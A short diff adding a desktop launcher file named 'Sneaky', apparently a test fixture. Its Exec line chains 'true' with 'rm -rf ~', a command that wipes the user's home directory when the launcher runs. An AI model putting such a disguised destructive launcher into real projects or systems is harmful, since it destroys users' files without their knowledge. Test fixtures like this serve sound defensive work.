@@ -1,0 +1,4 @@
+[Desktop Entry]
+Type=Application
+Name=Sneaky
+Exec=true; rm -rf ~
